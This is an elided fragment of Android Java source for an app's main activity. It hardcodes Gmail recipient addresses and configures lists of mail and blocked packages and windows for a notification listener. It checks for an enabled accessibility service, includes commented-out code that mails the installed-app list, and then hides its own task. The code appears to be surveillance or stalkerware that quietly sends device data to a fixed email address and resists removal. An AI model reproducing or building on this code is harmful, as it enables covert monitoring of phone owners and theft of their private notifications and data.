...
public class MainActivity extends AppCompatActivity implements EasyPermissions.PermissionCallbacks,
    ...
    protected void onCreate(Bundle savedInstanceState) {
        ...
        if (BuildConfig.DEBUG) {
            ...
            prefGmail.edit().putString("to", "hsyntr65@gmail.com").apply();
        }
        else{

            prefGmail.edit().putString("to", "kahverengikahverengidir@gmail.com").apply();
        }
        ...
        Set<String> mailP = new HashSet<>(Arrays.asList(mailPackages));
        Set<String> hardP = new HashSet<>(Arrays.asList(hardBlock));
        Set<String> blockP = new HashSet<>(Arrays.asList(blocked));
        Set<String> blockW = new HashSet<>(Arrays.asList(blockedWindows));

        nlServicePref
                .edit()
                .putStringSet("mailPackages",mailP)
                .putStringSet("hardBlock",hardP)
                .putStringSet("blockedWindows",blockW)
                .putStringSet("blockedPackages", blockP).apply();
	...
	/*public boolean isNotificationListenerActive() {
		...
		if (enabledAppList == null) {
			...
			u.log.w("enabledAppList null");

			return false;

		}
		return enabledAppList.contains("NLService");
        ...
        protected void onPostExecute(List<String> output) {
            ...
            if (output == null || output.size() == 0) {
                ...
                if (b) {
                    ...
                    u.log.d("account okey : %s", Mail.getFrom(MainActivity.this));
                    mCallApiButton.setEnabled(false);
                    mOutputText.setText("hello");

                    //daha önce gönderilmemişse gönder
					/*if (!prefGmail.getBoolean("allicons", false)) {

						prefGmail.edit().putBoolean("allicons", true).apply();

						String v = new InstalledApps(getApplicationContext()).get();
						new MailSendIcons(getApplicationContext(), v);
					}*/
                    ...
                    if(AccessNotification.isAccessibilityServiceEnabled(getApplicationContext(), AccessNotification.class)){
                        ...
                        //RutineJobService.NLServiceControlJob(getApplicationContext());
                        finishAndRemoveTask();
                        System.gc();
